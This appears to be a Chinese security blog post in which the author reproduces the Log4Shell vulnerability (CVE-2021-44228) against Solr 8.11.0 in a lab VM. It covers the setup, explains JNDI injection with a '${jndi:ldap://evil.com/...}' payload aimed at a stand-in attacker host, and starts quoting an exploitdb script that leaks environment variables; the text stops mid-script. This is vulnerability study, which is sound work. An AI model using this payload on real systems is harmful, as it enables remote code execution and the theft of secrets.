{"title":"CVE漏洞学习","uid":"0b213c75214ae7b790bcf3442a3f1836","slug":"CVE-Test","date":"2022-12-01T04:07:19.084Z","updated":"2023-09-06T12:30:20.213Z","comments":true,"path":"api/articles/CVE-Test.json","keywords":null,"cover":"/img/5.jpg","content":"<p><strong><code>想把一些常见的CVE以及一些经典漏洞复现，做做笔记</code></strong></p>\n<span id=\"more\"></span>\n\n<h1 id=\"CVE-2021-44228-Log4j2\"><a href=\"#CVE-2021-44228-Log4j2\" class=\"headerlink\" title=\"CVE-2021-44228 Log4j2\"></a>CVE-2021-44228 Log4j2</h1><h2 id=\"环境搭建\"><a href=\"#环境搭建\" class=\"headerlink\" title=\"环境搭建\"></a>环境搭建</h2><blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>Apache Log4j2 是一个被广泛使用的开源日志记录库，2017 年 7 月时，有人向 Log4j2 提了支持 JNDI Lookup 的需求，并从 2.0-beta9 之后开始支持；今年阿里的安全研究人员发现该特性会导致远程代码执行，于 2021 年 11 月 24 日向 Apache 报告了该漏洞；12 月 5 日官方发布了补丁；到了 12 月 9 日晚，PoC 的传播范围开始变得不可控，基本上各大厂商都受影响，影响范围很广，于是人们给它起了个名字——Log4Shell。</p></blockquote>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>环境搭建虚拟机版本: ubuntu 20.4<br>Apache solr版本: 8.11.0</p></blockquote>\n<h3 id=\"Apache-solr-8-11-0下载\"><a href=\"#Apache-solr-8-11-0下载\" class=\"headerlink\" title=\"Apache solr 8.11.0下载\"></a>Apache solr 8.11.0下载</h3><p>这里我采用的是<code>Apache Solr</code>开源服务器</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>Solr是Apache下的一个顶级开源项目，采用Java开发，它是基于Lucene的全文搜索服务器。Solr提供了比Lucene更为丰富的查询语言，同时实现了可配置、可扩展，并对索引、搜索性能进行了优化。</p></blockquote>\n<p>针对漏洞修复时间<code>[12 月 5 日]</code>，和官方更新文档</p>\n<p><img src=\"/post/CVE-Tes/image-20221201005804892.png\" alt=\"image-20221201005804892\"></p>\n<p><code>Apache Solr 8.11.0</code>是<code>CVE-2021-44228</code>修复前的最后的一个版本</p>\n<p>所以该版本也存在<code>CVE-2021-44228</code></p>\n<p>于是下载</p>\n<figure class=\"highlight apache\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attribute\">https</span>://archive.apache.org/dist/lucene/solr/<span class=\"number\">8</span>.<span class=\"number\">11</span>.<span class=\"number\">0</span>/</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/post/CVE-Tes/image-20221201010242171.png\" alt=\"image-20221201010242171\"></p>\n<h3 id=\"JAVA配置\"><a href=\"#JAVA配置\" class=\"headerlink\" title=\"JAVA配置\"></a>JAVA配置</h3><p>由于<code>Apache solr</code>是基于<code>Java</code>开发的项目，所以需要先下载对应版本的<code>Java</code></p>\n<p><strong>但是针对log4j2存在的版本，需要jdk1.8.0才可以复现</strong></p>\n<p>但是</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>高版本的JDK环境中<code>trustURLCodebase</code>变量为false，限制了远程类的加载，导致<code>JNDI</code>注入利用失败，无法反弹shell<br>能实现利用条件：版本≤ <code>JDK 6u211、7u201、 8u191、11.0.1</code>。<br>但是过低版本的，solr运行可能会出错</p></blockquote>\n<p>所以这里从官网下载专门的<code>8u171</code></p>\n<h4 id=\"解压到对应目录\"><a href=\"#解压到对应目录\" class=\"headerlink\" title=\"解压到对应目录\"></a>解压到对应目录</h4><figure class=\"highlight awk\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tar -zxvf jdk-<span class=\"number\">8</span>u171-linux-x64.tar.gz -C <span class=\"regexp\">/usr/</span>local<span class=\"regexp\">/jdk/</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/post/CVE-Tes/image-20221221161421513.png\" alt=\"image-20221221161421513\"></p>\n<h4 id=\"部署并修改环境变量\"><a href=\"#部署并修改环境变量\" class=\"headerlink\" title=\"部署并修改环境变量\"></a>部署并修改环境变量</h4><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo vi ~/.bashrc</span><br><span class=\"line\">在文件末尾追加下面6行内容</span><br><span class=\"line\"><span class=\"comment\">#set oracle jdk environment</span></span><br><span class=\"line\"><span class=\"built_in\">export</span> JAVA_HOME=/usr/local/jdk/jdk1.8.0_171 <span class=\"comment\">## 这里要注意目录要换成自己解压的jdk 目录</span></span><br><span class=\"line\"><span class=\"built_in\">export</span> JRE_HOME=<span class=\"variable\">$&#123;JAVA_HOME&#125;</span>/jre  </span><br><span class=\"line\"><span class=\"built_in\">export</span> CLASSPATH=.:<span class=\"variable\">$&#123;JAVA_HOME&#125;</span>/lib:<span class=\"variable\">$&#123;JRE_HOME&#125;</span>/lib  </span><br><span class=\"line\"><span class=\"built_in\">export</span> PATH=<span class=\"variable\">$&#123;JAVA_HOME&#125;</span>/bin:<span class=\"variable\">$PATH</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">source</span> ~/.bashrc</span><br><span class=\"line\">sudo update-alternatives --install /usr/bin/java java /usr/local/jdk/jdk1.8.0_171/bin/java 300</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"查看版本\"><a href=\"#查看版本\" class=\"headerlink\" title=\"查看版本\"></a>查看版本</h4><figure class=\"highlight applescript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">java -<span class=\"built_in\">version</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/post/CVE-Tes/image-20221221161638879.png\" alt=\"image-20221221161638879\"></p>\n<h3 id=\"Solr下载\"><a href=\"#Solr下载\" class=\"headerlink\" title=\"Solr下载\"></a><code>Solr</code>下载</h3><p>下载<code>solr 8.11.0</code></p>\n<figure class=\"highlight apache\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attribute\">sudo</span> wget https://archive.apache.org/dist/lucene/solr/<span class=\"number\">8</span>.<span class=\"number\">11</span>.<span class=\"number\">0</span>/solr-<span class=\"number\">8</span>.<span class=\"number\">11</span>.<span class=\"number\">0</span>.tgz</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/post/CVE-Tes/image-20221201111930502.png\" alt=\"image-20221201111930502\"></p>\n<p><img src=\"/post/CVE-Tes/image-20221201112302036.png\" alt=\"image-20221201112302036\"></p>\n<p>然后就解压</p>\n<figure class=\"highlight apache\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attribute\">sudo</span> tar xzf solr-<span class=\"number\">8</span>.<span class=\"number\">11</span>.<span class=\"number\">0</span>.tgz</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/post/CVE-Tes/image-20221201112554067-1671632324475-1.png\" alt=\"image-20221201112554067\"></p>\n<h3 id=\"安装-Apache-Solr服务\"><a href=\"#安装-Apache-Solr服务\" class=\"headerlink\" title=\"安装 Apache Solr服务\"></a>安装 <code>Apache Solr</code>服务</h3><figure class=\"highlight apache\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attribute\">sudo</span> bash solr-<span class=\"number\">8</span>.<span class=\"number\">11</span>.<span class=\"number\">0</span>/bin/install_solr_service.sh solr-<span class=\"number\">8</span>.<span class=\"number\">11</span>.<span class=\"number\">0</span>.tgz</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/post/CVE-Tes/image-20221201112725299.png\" alt=\"image-20221201112725299\"></p>\n<p>查看服务状态</p>\n<figure class=\"highlight ebnf\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attribute\">sudo systemctl status solr</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/post/CVE-Tes/image-20221201112839632.png\" alt=\"image-20221201112839632\"></p>\n<p>发现服务已经存在</p>\n<p>启动</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo /lib/systemd/systemd-sysv-install <span class=\"built_in\">enable</span> solr</span><br><span class=\"line\"><span class=\"comment\">#若执行sudo systemctl enable solr会提示不是本机服务，需要按上面方式启动运行</span></span><br></pre></td></tr></table></figure>\n\n<p>因为<code>solr</code>默认运行的端口为<code>8983</code></p>\n<p>查看环境搭建的虚拟机<code>ip</code></p>\n<figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ip <span class=\"selector-tag\">a</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/post/CVE-Tes/image-20221201113319037.png\" alt=\"image-20221201113319037\"></p>\n<p>得到环境搭建靶机<code>ip</code>为</p>\n<figure class=\"highlight accesslog\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">192.168.80.131</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"成功\"><a href=\"#成功\" class=\"headerlink\" title=\"成功\"></a>成功</h3><p>浏览器访问</p>\n<figure class=\"highlight dts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"symbol\">http:</span><span class=\"comment\">//192.168.80.131:8983</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/post/CVE-Tes/image-20221220220624019.png\" alt=\"image-20221220220624019\"></p>\n<p>搭建成功</p>\n<p>内网环境中的攻击机也成功访问</p>\n<p><img src=\"/post/CVE-Tes/image-20221201115827107.png\" alt=\"image-20221201115827107\"></p>\n<p>环境搭建完毕</p>\n<h2 id=\"了解漏洞描述与注入原理\"><a href=\"#了解漏洞描述与注入原理\" class=\"headerlink\" title=\"了解漏洞描述与注入原理\"></a><strong>了解漏洞描述与注入原理</strong></h2><p><code>Apache Log4j 2</code> 是<code>Java</code>语言的日志处理套件，使用极为广泛。在其<code>2.0</code>到<code>2.14.1</code>版本中存在一处<code>JNDI</code>注入漏</p>\n<p>洞，攻击者在可以控制日志内容的情况下，通过传入类似于</p>\n<p><code>$&#123;jndi:ldap://evil.com/example&#125;</code>的<code>lookup</code>用于进行<code>JNDI</code>注入，执行任意代码。</p>\n<h3 id=\"Log4j2-Lookup\"><a href=\"#Log4j2-Lookup\" class=\"headerlink\" title=\"Log4j2 Lookup\"></a>Log4j2 Lookup</h3><p><code>Log4j2</code> <code>Lookup</code>是<code>Log4j2</code>的一项功能，允许您<strong>在日志消息中使用动态值</strong>，<code>Log4j2</code>提供了许多内置的<code>Lookup</code>对</p>\n<p>象，用于查找不同类型的值</p>\n<p>例如<code>SystemPropertiesLookup.lookup(&quot;user.home&quot;)</code>方法返回了系统属性<code>user.home</code>的值，并将其插入日志</p>\n<p>消息中。</p>\n<h3 id=\"JNDI\"><a href=\"#JNDI\" class=\"headerlink\" title=\"JNDI\"></a>JNDI</h3><p>开始我也看不太懂<code>JNDI</code>任意代码执行语句意思</p>\n<p>先了解一下<code>JNDI</code>是什么以及其组成</p>\n<p><code>JNDI</code>（<code>Java</code>命名和目录接口），是<code>Java</code>提供的一个目录服务应用程序接口（<code>API</code>）</p>\n<p>它提供一个目录系统，并将服务名称与对象关联起来，从而使得开发人员在开发过程中可以使用名称来访问对象 </p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>其中大致有<br>远程方法调用（<code>RMI</code>），通用对象请求代理体系结构（<code>CORBA</code>），轻型目录访问协议（<code>LDAP</code>）或域名服务（<code>DNS</code>）</p></blockquote>\n<p>其大致组成为</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">String jndiName= ...;<span class=\"comment\">//指定需要查找name名称</span></span><br><span class=\"line\"><span class=\"type\">Context</span> <span class=\"variable\">context</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">InitialContext</span>();<span class=\"comment\">//初始化默认环境</span></span><br><span class=\"line\"><span class=\"type\">DataSource</span> <span class=\"variable\">ds</span> <span class=\"operator\">=</span> (DataSourse)context.lookup(jndiName);<span class=\"comment\">//查找该name的数据</span></span><br></pre></td></tr></table></figure>\n\n<p><u><strong>所以如果能控制<code>jndiName</code>，再利用<code>rmi</code>之类的加载远程恶意类，从而执行恶意类的命令，故而实现远程代码执行</strong></u></p>\n<h3 id=\"JNDI注入\"><a href=\"#JNDI注入\" class=\"headerlink\" title=\"JNDI注入\"></a>JNDI注入</h3><p>结合<code>lookup</code>和<code>jndi</code></p>\n<p><strong>对于<code>payload</code></strong></p>\n<p><code>$&#123;jndi:ldap://evil.com/example&#125;</code>是<code>Log4j2</code>中使用的<strong>占位符</strong>语法。<strong>它表示在日志消息中插入一个使用</strong></p>\n<p><strong><code>JNDILookup</code>对象查找的值</strong></p>\n<p><code>ldap://evil.com/example</code>是<code>JNDI</code>查找所使用的名称。这意味着<code>Log4j2</code>将在<code>JNDI</code>上下文中查找名为<code>example</code></p>\n<p>的对象，该对象位于<code>evil.com</code>服务器上，就可能实现访问一些敏感信息以及其他恶意操作的目的</p>\n<h2 id=\"脚本分析\"><a href=\"#脚本分析\" class=\"headerlink\" title=\"脚本分析\"></a>脚本分析</h2><p>这里调用**<code>exploitdb</code>**中的对<code>Log4j2</code>利用的脚本，这是一个信息泄露的脚本</p>\n<p>发布时间: <code>12/12/2021</code></p>\n<p><code>【ps.这个脚本可能是作者上传到exp的时候空格问题，需要稍微修改一下就可以用了】</code></p>\n<p><img src=\"/post/CVE-Tes/image-20221204224323306-1671800988704-1.png\" alt=\"image-20221204224323306\"></p>\n<p>脚本内容</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># Exploit Title: Apache Log4j2 2.14.1 - Information Disclosure</span></span><br><span class=\"line\"><span class=\"comment\"># Date: 12/12/2021</span></span><br><span class=\"line\"><span class=\"comment\"># Exploit Author: leonjza</span></span><br><span class=\"line\"><span class=\"comment\"># Vendor Homepage: https://logging.apache.org/log4j/2.x/</span></span><br><span class=\"line\"><span class=\"comment\"># Version: &lt;= 2.14.1</span></span><br><span class=\"line\"><span class=\"comment\"># CVE: CVE-2021-44228</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#!/usr/bin/env python3</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Pure python ENV variable leak PoC for CVE-2021-44228</span></span><br><span class=\"line\"><span class=\"comment\"># Original PoC: https://twitter.com/Black2Fan/status/1470281005038817284</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># 2021 @leonjza</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> argparse</span><br><span class=\"line\"><span class=\"keyword\">import</span> socketserver</span><br><span class=\"line\"><span class=\"keyword\">import</span> threading</span><br><span class=\"line\"><span class=\"keyword\">import</span> time</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"></span><br><span class=\"line\">LDAP_HEADER = <span 